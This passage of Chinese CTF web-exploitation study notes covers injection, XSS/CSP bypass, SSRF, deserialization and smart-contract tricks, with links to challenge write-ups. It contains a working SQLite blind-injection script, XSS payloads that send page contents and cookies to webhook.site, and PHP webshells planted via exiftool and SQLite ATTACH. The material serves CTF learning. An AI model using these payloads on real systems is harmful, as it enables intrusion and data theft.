82. php [parse_url解析漏洞](https://www.cnblogs.com/tr1ple/p/11137159.html)。再给出一个比较简短的[参考](https://blog.csdn.net/q1352483315/article/details/89672426)。例题:[[N1CTF 2018]eating_cms](https://blog.csdn.net/mochu7777777/article/details/105337682),这题还有个文件名命令注入。该题的关键点在于伪协议读取源码，但关键文件名被过滤。url经过parse_url过滤，所以构造`//user.php?page=php://filter/convert.base64-encode/resource=upllloadddd.php`来绕过过滤。注意题目的php版本是5.5.9，现在7+版本运行结果会不一样。

```php
<?php
$url6 = "//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg";
$keywords = ["flag","manage","ffffllllaaaaggg","info"];
$uri=parse_url($url6);
var_dump($uri);
parse_str($uri['query'], $query);
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                echo 'no1';
            if (stristr($v, $token))
                echo 'no2';
        }
    }
'''
7+
array(2) {
  ["host"]=>
  string(8) "user.php"
  ["query"]=>
  string(64) "page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
no2
'''

'''
5.5.9
array(2) {
  ["host"]=>
  string(17) "user.php?page=php"
  ["path"]=>
  string(55) "//filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
'''
```

发现7+版本解析正常，而5.5.9版本把url的query解析成了path，自然就能绕过过滤了。同时，多加一条斜线不会影响apache解析路径。

83. sqlmap使用[参考](https://www.freebuf.com/sectool/164608.html)。
84. php引用赋值。例题:[BUU CODE REVIEW 1](https://blog.csdn.net/qq_45555226/article/details/110003144)
85. 伪造内网ip的几种方式。

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
X-Client-IP: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Real-ip: 127.0.0.1
X-rewrite-url: secret.php //这个是bypass 403
```

1.  [使用curl发送post请求](https://blog.csdn.net/m0_37886429/article/details/104399554)。
2.  [存储型xss](https://www.ddddy.icu/2022/03/31/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/)。
3.  linux下，/proc/self/pwd/代表当前路径。
4.  php session反序列化漏洞+SoapClient CRLF注入+SSRF。例题:[bestphp's revenge](../../CTF/BUUCTF/Web/bestphp's%20revenge.md)
5.  call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法。
6.  js原型链污染导致的命令执行。例题:[[GYCTF2020]Ez_Express](../../CTF/BUUCTF/Web/[GYCTF2020]Ez_Express.md)。不仅仅是merge、clone函数会导致原型链污染，同样是express带有的[undefsafe](https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)函数也会引发此漏洞。例题:[[网鼎杯 2020 青龙组]notes](https://blog.csdn.net/qq_45708109/article/details/108233667)
7.  js大小写特性
- 对于toUpperCase():
> 字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
- 对于toLowerCase():
> 字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)
1.  基础存储型xss获取管理员cookie。例题:[BUU XSS COURSE 1](https://www.cnblogs.com/rabbittt/p/13372401.html)
2.  sql堆叠注入+预处理语句。例题:[supersqli](../../CTF/攻防世界/2级/Web/supersqli.md)
3.  [MySQL注入 利用系统读、写文件](https://www.cnblogs.com/mysticbinary/p/14403017.html)
4.  sql堆叠注入+预处理注入写入shell+[char函数](https://blog.csdn.net/asli33/article/details/7090717)绕过过滤。例题:[[SUCTF 2018]MultiSQL](https://blog.csdn.net/mochu7777777/article/details/105230001)
5.  [nginx配置错误导致的目录穿越漏洞](https://blog.csdn.net/haoren_xhf/article/details/107367766)。
6.  python存储对象的位置在堆上，因此可以利用/proc/self/maps+/proc/self/mem读取到SECRET_KEY。例题:[catcat-new](../../CTF/攻防世界/2级/Web/catcat-new.md)
7.  [.htaccess的使用技巧](https://blog.csdn.net/solitudi/article/details/116666720)
8.   [php利用伪协议绕过exit](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)。例题:[[EIS 2019]EzPOP](https://blog.csdn.net/TM_1024/article/details/116208390)
9.   php中使用create_function()创建的函数命名规律遵循：%00lambda_%d，其中%d是持续递增的。例题:[[SUCTF 2018]annonymous](https://blog.csdn.net/mochu7777777/article/details/105225558)
10.  [SSRF漏洞利用方式](https://www.anquanke.com/post/id/239994)
11.  thinkphp默认上传路径是/home/index/upload
12.  php中不同的序列化引擎所对应的session的存储方式不相同。

```
php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值
```

Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。

105. [利用本地DTD文件的xxe](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)。例题:[[GoogleCTF2019 Quals]Bnv](https://syunaht.com/p/1267717976.html)。
106. [xpath注入](https://www.cnblogs.com/backlion/p/8554749.html)。例题:[[NPUCTF2020]ezlogin](https://tyaoo.github.io/2020/05/26/BUUCTF-2/)
107. express的parameterLimit默认为1000;根据rfc，header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行。例题:[ez_curl](../../CTF/攻防世界/4级/Web/ez_curl.md)
108. java WEB-INF目录泄露+任意文件读取。例题:[[RoarCTF 2019]Easy Java](../../CTF/BUUCTF/Web/[RoarCTF%202019]Easy%20Java.md)
109. 调用shell执行代码时，被反引号扩起来的内容会先执行，以此可用于绕过一些固定的格式。比如写入的system语句会被包装成json这种情况就可用反引号绕过。例题:[[2020 新春红包题]1](https://www.zhaoj.in/read-6397.html)
110. 如果当前的权限不够，想用已知有权限的账号cat flag，可用：

- printf "GWHTCTF" | su - GWHT -c 'cat /GWHT/system/of/a/down/flag.txt'

这里的账号名为GWHT，密码为GWHTCTF。

111. curl发送自定义数据包（PUT方法，origin，-u选项等）。例题:[[BSidesCF 2020]Hurdles](https://blog.csdn.net/weixin_44037296/article/details/112298411)
112. thinkphp V6.0.x 反序列化链利用。例题:[[安洵杯 2019]iamthinking](https://xz.aliyun.com/t/9546)
113. php hash_hamc函数绕过。`hash_hmac($algo, $data, $key)`：当传入的data为数组时，加密得到的结果固定为NULL。例题:[[羊城杯 2020]Blackcat](https://blog.csdn.net/qq_46263951/article/details/119796671)
114. node js 8.12.0版本的[拆分攻击（CRLF）可造成SSRF](https://xz.aliyun.com/t/2894)+pug模板引擎命令执行。例题:[[GYCTF2020]Node Game](https://blog.csdn.net/cjdgg/article/details/119068329)
115. php7.4的FFI扩展安全问题以及利用（绕过disabled functions）。例题:[[RCTF 2019]Nextphp](https://blog.csdn.net/RABCDXB/article/details/120319633)
116. perl 文件上传+ARGV的利用。例题:[i-got-id-200](../../CTF/攻防世界/6级/Web/i-got-id-200.md)
117. unzip中[软链接](https://blog.csdn.net/weixin_44966641/article/details/119915004)的利用。ln -s是Linux的一种软连接,类似与windows的快捷方式。可以利用压缩了软链接的zip包[任意读取文件](https://xz.aliyun.com/t/2589)。例题:[[SWPU2019]Web3](https://blog.csdn.net/mochu7777777/article/details/105666388)
118. 特殊的flask cookie伪造。与一般的不同，使用get_signing_serializer。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
def index():
    print(session_serializer.dumps("admin"))
index()
#ImFkbWluIg.Y9WDSA.AbIYU50Boq_syWcomulegtw9fnc
```

例题:[[FBCTF2019]Event](https://blog.csdn.net/mochu7777777/article/details/107653920)

119. python利用type函数[动态创建类](http://c.biancheng.net/view/2292.html)。
120. python路径拼接os.path.join()函数当其中一个参数为绝对路径时，前面的参数会被舍弃，利用这个特点可以绕过一些路径限制。例题:[[HFCTF 2021 Final]easyflask](https://blog.csdn.net/LYJ20010728/article/details/117422046)
121. 一段数据以rO0AB开头，基本可以确定这串就是Java序列化base64加密的数据;如果以aced开头，那么是一段Java序列化的16进制。
122. java [JDBCsql注入](https://www.wangan.com/docs/94)+burpsuite java Deserialization Scanner插件+ysoserial（java反序列化漏洞工具）。例题:[[网鼎杯 2020 朱雀组]Think Java](https://blog.csdn.net/RABCDXB/article/details/124003575)
123. 在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个设置叫[session.upload_progress.enabled](https://xz.aliyun.com/t/9545)，默认为On，在这个选项被打开后，在multipart POST时传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()。借此可以绕过一些需要session才能访问的文件的限制，甚至RCE。例题:[[PwnThyBytes 2019]Baby_SQL](https://blog.csdn.net/SopRomeo/article/details/108967248)。
124. node.js早期版本（<8.0)中，沙箱vm2有个特性：当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。一个调用过的变量，一定会存在内存中，也就是说，我们可以使用Buffer函数读取沙箱之外的变量内容，实现沙箱逃逸。例题:[[HITCON 2016]Leaking](https://blog.csdn.net/weixin_44037296/article/details/112387663)
125. 对于SSRF，127.0.0.1无法使用的情况下，可以考虑0.0.0.0。
126. [redis](https://blog.csdn.net/like98k/article/details/106417214) [主从复制](https://www.cnblogs.com/karsa/p/14123957.html) [SSRF](https://xz.aliyun.com/t/5665)（RCE）。主要利用[Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)和[redis-ssrf](https://github.com/xmsec/redis-ssrf)两个工具。例题:[[网鼎杯 2020 玄武组]SSRFMe](https://blog.csdn.net/rfrder/article/details/113651337)
127. [[NPUCTF2020]验证🐎](https://blog.csdn.net/hiahiachang/article/details/105756697)。本题的知识点有：

- js中列表，对象等与字符串相加会导致强制类型转换，结果为字符串。可用这个特点绕过一些md5加盐。以及，绕过md5时如果程序启用了json，可以利用json构造对象绕过大部分限制。
- js利用__proto__可从原型链上引出Function和String，Function用于构造函数，String用于得到fromCharCode绕过强制过滤。利用`process.mainModule.require('child_process').execSync('cat /flag')`进行rce，同时还利用了箭头函数。

128. 可以使用以下内容来绕过php的getmagesize()函数获得的图片长宽。

```
#define width 1
#define height 1
```

放头部和末尾都可以。

129. php的mb_strtolower()函数可用于绕过一些过滤。

```php
<?php
var_dump(mb_strtolower('İ')==='i');
//true
?>
```

130. 可绕过php getmagesize()函数的图片马生成[工具](https://github.com/huntergregal/PNG-IDAT-Payload-Generator)。例题:[[CISCN2021 Quals]upload](https://blog.csdn.net/jiangdie666/article/details/116997461)
131. 网页版post上传文件代码。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf=upload" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

132. [MongoDB](https://zhuanlan.zhihu.com/p/87722764) sql注入。和普通sql注入相似，只是MongoDB还支持js语法，所以有的时候可以直接用js报错爆出字段值。例题:[[2021祥云杯]Package Manager 2021](https://blog.csdn.net/RABCDXB/article/details/124810618)
133. 在正则匹配的时候，如果没有用^$匹配头部或者尾部，就会存在简单的绕过。比如下面的正则：

```js
const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}
```

只需要在想填的值前面加上32个任意字符即可绕过。

134. 下面这段代码：

```php
if($count[]=1)
```

表示给\$count[]数组末尾添加一个1，如果添加成功返回1，否则0。这个可以用php的整形溢出绕过。如果数组里已有9223372036854775807个元素，末尾再增添元素就会整形溢出，导致返回false。此为“使用数组整型溢出绕过赋值式“永真”判断”。

135. 攻击 [php-fpm](https://tttang.com/archive/1775/) /pfsockopen绕过 disable_functions+[SUID提权](https://tttang.com/archive/1793/#toc_find-exec)。例题:[[蓝帽杯 2021]One Pointer PHP](https://blog.csdn.net/cosmoslin/article/details/121332240)
136. [利用pearcmd.php从LFI到getshell](https://blog.csdn.net/rfrder/article/details/121042290)。例题:[[HXBCTF 2021]easywill](https://cn-sec.com/archives/1478076.html)。提供p神的另一篇[文章](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)。
137. sql注入利用hex绕过过滤+利用位运算判断flag16进制长度+利用[replace](https://blog.csdn.net/bingguang1993/article/details/80592579)和[case-when-then](https://zhuanlan.zhihu.com/p/165423831)盲注。这题的思路很巧妙，首先是位运算算flag长度：`假设flag的长度为 x,而y 表示 2 的 n 次方,那么 x&y 就能表现出x二进制为1的位置,将这些 y 再进行或运算就可以得到完整的 x 的二进制,也就得到了 flag 的长度`。然后是构造报错语句实现盲注：`在sqlite3中,abs函数有一个整数溢出的报错,如果abs的参数是-9223372036854775808就会报错,同样如果是正数也会报错`。又因为引号被过滤，无法直接输入a，b这类16进制数字，靠trim数据库里已有的数据的16进制来得到所有的16进制字符，最后更是利用abs的性质报错实现盲注。

```python
# coding: utf-8
import binascii
import requests
URL = 'http://85ede6a8-f6ba-463f-996d-499f800d6cf0.node4.buuoj.cn:81/vote.php'
l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data={
    'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<j})when(0)then(0)else(0x8000000000000000)end)'
  })
  if b'An error occurred' in r.content:
    l |= 1 << j
print('[+] length:', l)
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'
res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

题目:[[HarekazeCTF2019]Sqlite Voting](https://blog.csdn.net/qq_46263951/article/details/119727922)

138. [uuid v1](https://versprite.com/blog/universally-unique-identifiers/)是可以预测的,因此用v1版本的uuid做身份认证有被爆破预测uuid的风险。在js里，node ID和clock sequence如下给出：

```js
var adminuuid = uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
//node=0x67696e6b6f69
//clockseq=0b10101001100100=0x2a64,第一位会根据UUID variant变化
```

python里则是：

```python
UUIDv1 = str(uuid1(node=0x67696E6B6F69, clock_seq=0b10101001100100))
```

例题:[uuid hell](https://ctftime.org/writeup/36173)

139. Mercurial SCM .hg文件夹泄露。Mercurial SCM也有一个和git类似的库管理命令：hg。注意它在遇见特殊字符时会转义，但是转义符是"_"。意味着一个名字包含一个下划线的文件最终文件名里会有两个下划线。例题:[my-chemical-romance](https://ctftime.org/writeup/36174)
140. xss绕过[HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)和`default-src 'none'; script-src 'unsafe-inline'`[csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)设置。前者让我们无法document.cookie盗取admin cookie值，后者允许内嵌式js脚本，但不允许以任何形式加载文件，包括服务器自身的。意味着无法以任何常见的形式发送请求，比如常用的fetch。替代方式是以form的形式发送POST。

```html
<form method="post" id="theForm" action="/flag"></form> <!-- action填要访问的网址 -->
<script> 
    document.getElementById('theForm').submit();
</script>
```

如果要打开的目标网页会重定向，可以考虑在代码中加入打开另一个窗口的操作，使用setTimeout函数保持当前网页脚本的运行，在打开的窗口中获取到flag。例如:

```html
<form method="post" id="theForm" action="/flag" target='bruh'>
    <!-- Form body here -->
</form>
<script> 
    let w = window.open('','bruh');
    document.getElementById('theForm').submit();
    setTimeout(()=>{
        document.location= `https://webhook.site/645c6365-01c7-4535-a172-a9014e389741?c=${w.document.body.innerHTML}`
    },500);
</script>
```

例题:[california-state-police](https://blog.jaquiez.dev/Blog/LACTF2023/#CSP)。能成功的原因在于：根据[MDN文档](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)，window.open会在目标的环境（context）打开一个空白窗口，意味着同域内的内容可用js访问。

该题的另外一种[做法](https://hackmd.io/@lamchcl/r1zQkbvpj#cryptohill-easy)思路差不多，不过用了两个report：

```html
<script>
setTimeout(()=>{location="https://webhook.site/ac78b7a4-1e35-4fd9-ac25-83a47c4ecf09?a="+encodeURIComponent(window.opener.document.documentElement.outerHTML)},200)
</script>
```

```html
<form action="/flag" method=POST></form>
<script>
window.open("/report/11da7ab4-821d-4f2f-8ea1-e829d74a6366", target="_blank")
document.forms[0].submit();
</script>
```

后者是提交给admin bot的report。发现主要思路还是利用form访问flag然后利用打开的另一个窗口将内容带出来。

如果非要在开启HttpOnly的情况下获取cookie，在php驱动的网站下，尝试找phpinfo界面，里面有个HTTP_COOKIE字段。xss让bot访问phpinfo界面，找HTTP_COOKIE字段就能拿到cookie了。脚本参考：

```html
<script>
fetch('/phpinfo.php', {
method: 'POST'})
.then((response) => response.text())
.then((data) => fetch('webhook之类网址', {
method: 'POST',body:btoa(data)}));
</script>
```

141. js中的type juggling。审查源码时，可能会发现服务器期望输入变量是字符串等简单类型，但如果没有对变量做严格过滤，或是使用了express的`express.urlencoded()`（其extended属性默认接受复杂类型），就可以尝试攻击，比如改成数组之类的。例题:[queue up!](https://github.com/sambrow/ctf-writeups/blob/main/2023/la-ctf/queue-up.md)
142. 当xss代码以innerHTML形式插入时，浏览器不会执行这样的代码。可以用`<img/src=1 onerror=function()>`或`<iframe>`替代。`<iframe>`有个srcdoc属性，里面的内容会被当作html执行。这种解法可在[这里](https://hackmd.io/@lamchcl/r1zQkbvpj#webhptla)找到。
143. js的多行注释/\*\*/可用于绕过滤和跨多行执行xss，不过要注意，多行注释不要用在js关键字中间，例如`win/**/dow`。因为js会把/\*\*/解释为空格，window就失效了。例题:[hptla](https://blog.jaquiez.dev/Blog/LACTF2023/#hptla)
144. typescript+ssrf。例题:[[2021祥云杯]secrets_of_admin](https://blog.csdn.net/weixin_46081055/article/details/123959252)。此题的知识点：

- 下面这个路由：

```ts
router.get('/api/files/:id'...)
```

当我们访问`http://xxx.com/api/files/aaa`时，aaa就是id的值。
- 利用\<img\>标签的src属性触发ssrf。\<img\>标签会加载src指定的资源，如果我们往src里输入想要ssrf的目标网址，自然就是用当前服务器的身份构造了一次ssrf了。其他有类似属性的标签也可以这么用。当然，对应网址需要被加载，这题里面触发场景为html转pdf时加载图片资源。
- `content.includes('<')`可以用数组类型的`content[]`绕过。
- http-pdf 任意文件读取漏洞。可以用XHR（XMLHttpRequest）任意文件读取。
- ts开放在8888端口。
- 当看到`filename   VARCHAR(255) NOT NULL UNIQUE`的数据库配置,说明filename这个字段值不能重复。这道题的解决方法是构造垃圾目录（flag已有，构造./flag，由于路径字符串拼接，没有影响）。

145. mysql查询特性。

- 不分大小写/多余空格。下面的代码：

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if ($username=="admin" && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //查询逻辑，用户名和密码为admin/admin，查得出来就给flag
}
```

可以用`http://xxx.com?username=Admin&password=admin`来绕过。就算填写的用户名是Admin，依然能查询出来admin的数据。另一种绕过方式是`http://xxx.com?username=admin &password=admin`，多了个空格。
- 默认将unicode字符转为字母。

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if (preg_match("/admin/i",$username) && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //查询逻辑，用户名和密码为admin/admin，查得出来就给flag
}
```

可以用`?username=Àdmin&password=admin`绕过。这里使用的`À`会被标准化成A，不影响查询结果，但可以绕过正则。另外，这道题还告诉我`$_SERVER['REMOTE_ADDR']!=="127.0.0.1"`是不可绕过的。

146. 上传图片的xss挑战可以考虑上传svg类型（svg图片存在`<script>`标签，可以插入xss代码）。
147. 如果服务器返回的报文没有`Content-Type`字段，浏览器就需要强制解析返回的内容，借此可以执行一些恶意代码（比如上传图片，但是内容是xss。如果此时服务器不返回images/png的`Content-Type`，浏览器就要解析图片，执行xss）。对于apache服务器，当文件名不存在后缀时，它不会返回`Content-Type`字段。这些文件名有`.png`,`.jpg`甚至`...png`（任意数量的点）。
148. [DomPurify.sanitize](https://cloud.tencent.com/developer/article/1825938)过滤下的xss。sanitize只允许创建`[div,a,span,p]`html标签和属性`[style,id,name,href]`，这种情况下在没有用户交互的前提下是不可能成功执行有用的xss的。不过既然开放了一些标签，可以考虑[dom clobbering](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)。例如在插入`<p id='test'>`这个标签后，在js里可以通过`test`或者`window.test`来获取到它。这意味着：

```js
if(user.isAdmin){
    //期望执行逻辑
}
```

这样的代码可以通过创建`"<a/id='user'><a/id='user'/name=isAdmin>"@g.com`来覆盖原本的`user.isAdmin`，使其进入if语句（这里payload的`/`和`@g.com`是因为题目要求输入内容为邮箱，加入`/`代替空格使其符合邮箱格式）。注意无需给其赋值，让它存在并覆盖原来的就行。

145. 绕过getimagesize（将js代码插入有效图片）+绕过csp `script-src 'self'`。可直接使用这篇[文章](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)的poc图片，hex editor打开图片找到`alert`代码即可将其换为任意其他js代码。
146. php的include函数包含木马时，木马文件的后缀名无需是php，jpg等也行，只要图片文件里包含php木马代码。可以考虑用exiftool把木马写到注释里：`exiftool img.jpg -Comment="<?=system(\$_GET[0]);die();?>"`。
147. php [realpath](https://www.php.net/manual/zh/function.realpath.php)函数在参数路径开头为`file:///`时，会返回空字符串。
148. sqlite利用查询语句写入php shell文件。要注意ATTACH DATABASE的路径需要可读可写。

```sql
ATTACH DATABASE '/var/www/html/socengexpasdf.php' AS socengexpasdf;
CREATE TABLE socengexpasdf.pwn (dataz text);
INSERT INTO socengexpasdf.pwn VALUES ('<? system($_GET["cmd"]); ?>');
```

[ATTACH DATABASE](https://www.runoob.com/sqlite/sqlite-attach-database.html)附加数据库`/var/www/html/socengexpasdf.php`，因为该文件不存在，故会在/var/www/html/下创建一个socengexpasdf.php，别名为socengexpasdf，下面的语句都是基于别名来操作的。[CREATE TABLE](https://www.runoob.com/sqlite/sqlite-create-table.html)在刚才指定的socengexpasdf数据库下创建一个名为pwn的表，(dataz text)指定数据类型。[INSERT INTO](https://www.runoob.com/sqlite/sqlite-insert.html)插入shell代码。

149. 根据查询结果重定向不同的url的设计加上不安全的cookie设置（SameSite: None;Secure: false:）可能有[XS-leak](https://xsleaks.dev/)。例题:[secrets](../../../../CTF/HackTM%20CTF/Web/secrets.md)，此题的预期解为[Cross-Origin Redirects and CSP Violations](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)，非预期解则是利用了chrome的url大小最大为2MB的限制。
150. 利用sql [like](https://www.runoob.com/sql/sql-like.html)语句爆破code+利用BeautifulSoup与浏览器解析html的区别绕过xss过滤+利用www.youtube.com的[JSONP](https://www.zhihu.com/question/19966531)绕过CSP限制。例题:[Crocodilu](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu)。题目要求激活用户需要输入code，但code是4位随机数字且一个邮箱账号因为[redis](https://zhuanlan.zhihu.com/p/51608696)的限制只允许爆破一次。漏洞代码为下面的sql语句：

```sql
SELECT * FROM users WHERE email LIKE "email" AND code LIKE "code"
```

且邮箱验证代码使用了python的re.match：

- If zero or more characters at the beginning of string match the regular expression pattern, return a corresponding match object. Return None if the string does not match the pattern; note that this is different from a zero-length match. 

允许我们在正确格式的邮箱末尾添加sql里的通配符%。只要我们在输入邮箱时基于原来的邮箱不停在末尾添加%，redis不会将其识别为同一个邮箱，但sql查询时会，成功绕过一个邮箱账号只能爆破一次的难题。

关于BeautifulSoup，对于下面的结构：

```html
<!--><script>alert(1)</script>-->
```

BeautifulSoup会将其解析为注释，但浏览器会将其解析为script，成功执行代码。

151. 利用jQuery load函数的特性执行xss。例题:[Hades](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/hades)。此题的关键代码在于：

```js
$('#ajax-load').load('/ajax/articles?cat=news');
```

其中news可控。如果我们构造paylaod:`/ajax/articles?cat=asdf"x="`，服务器会返回：

```html
<noscript>
    If you can't see anything, you have to enable javascript
    <img src="/images/error.jpg" alt="selected category asdf"x="" />
</noscript>
```

给img注入了一个属性，但是因为[<noscript>](https://www.runoob.com/tags/tag-noscript.html)标签的存在，无法执行xss。于是根据jQuery[文档](https://api.jquery.com/load/)，利用load函数的提取标签特性成功盗取cookie。

152. flask session密钥爆破工具：[flask-unsign](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign)。例题:[Chocholates](https://eszfrigyes.com/2023/02/ctf-writeup-chocolates-mhsctf2023/)
153. 智能合约（[solidity](https://docs.soliditylang.org/en/v0.8.17/index.html)语言）初探。例题:[Guess The Name](https://github.com/skabdulhaq/CTF-learnings/blob/main/CTF-writeups/BytesbanditCTF/blockchain-GuessTheName.md)。此题代码很简单，解法是自己写另一个合约，内部根据Challenge合约里已有的接口重写方法，使其返回True；然后连上题目提供的Challenge合约，使用[msg.sender](https://stackoverflow.com/questions/48562483/solidity-basics-what-msg-sender-stands-for)地址[释放](https://www.web3.university/tracks/create-a-smart-contract/deploy-your-first-smart-contract)刚才的写的合约。Challenge合约调用重写的函数，获取flag。

在[ctf wiki](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)看见了msg.sender的详细解释。msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。给定这样一个场景，如用户通过合约 A 调合约 B，此时对于合约 A : msg.sender 是用户；对于合约 B : msg.sender 是合约 A

154. [Tor](https://zh.wikipedia.org/zh-cn/Tor)可以访问以onion结尾的网站。例题:[Hash Browns](https://medium.com/@vj35.cool/the-bytebandits-ctf-2023-449a2d64c7b4)
155. onERC721Received回调函数可能触发[Re-Entrancy Attack](https://steemit.com/cn/@chenlocus/reentrancy)（重入攻击，特征为先操作后改状态）+js/python释放合约。例题:[Dragon Slayer](../../CTF/HackTM%20CTF/Web/Dragon%20Slayer.md)。
156. [zero-trust](https://github.com/5t0n3/ctf-writeups/blob/main/2023-lactf/web/zero-trust/README.md)
- AES-256-[GCM](https://zh.wikipedia.org/wiki/%E4%BC%BD%E7%BD%97%E7%93%A6/%E8%AE%A1%E6%95%B0%E5%99%A8%E6%A8%A1%E5%BC%8F)(带认证的AES加密)正确使用可防止密文篡改，此题演示了一种错误使用方式：使用decipher.setAuthTag()后却不使用decipher.final()（参考Node.js的[Crypto](https://nodejs.org/api/crypto.html#decipherfinaloutputencoding)模块）。setAuthTag()函数设置一个tag，在最后使用final函数时如果没有提供一样的tag或者密文被篡改，就会报错。
- AES-256-GCM按128位分块。这题已知部分密文对应的明文，就可以用明文异或密文获取部分加密时的key。此时就能用这小部分key篡改密文了。
157. [evmvm](../../CTF/LA%20CTF/Web/evmvm.md).
- EVM虚拟机[opcode](https://www.evm.codes/?fork=merge)
- solidity [assembly](https://docs.soliditylang.org/en/v0.8.19/assembly.html)内部的语言是[yul](https://docs.soliditylang.org/en/v0.8.17/yul.html)。
- [GAS](https://zhuanlan.zhihu.com/p/34960267)，[calldata](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/f958b119-5a8d-4050-ad68-6422d10a7655.xhtml)和[function selector](https://solidity-by-example.org/function-selector/)等概念
158. [sqlite注入](https://juejin.cn/post/7016991806759911454)。sqlite的语法大部分和sql差不多，不过注释符是`--`,`;`,`/*`。
159. JWT不仅可以被存储在Cookie里，也可以被存在浏览器的Local Storage里。
160. [RPS](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/RPS/writeup.md)（另一版本[wp](https://sichej.it/writeups/rps-writeup/)）
- [plain input(text) fields](https://stackoverflow.com/questions/56843356/plain-text-field-validation-for-protection-against-xss-attack)路由可能会成为xss的潜在攻击对象。或者说，当题目明确提示要成为admin+有机器人/管理员会查看xxx等提示时，就要考虑xss了。管理员要查看的xxx就是需要特别关注的地方。
- 同样的xss更改邮箱（可以换成任何其他题目的路由）payload，既可以用fetch：

```js
<script>
    fetch("https://rps.ctf.pragyan.org/email", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        credentials: "include",
        body: "newEmail=youremail%40gmail.com",
    });
</script>
```

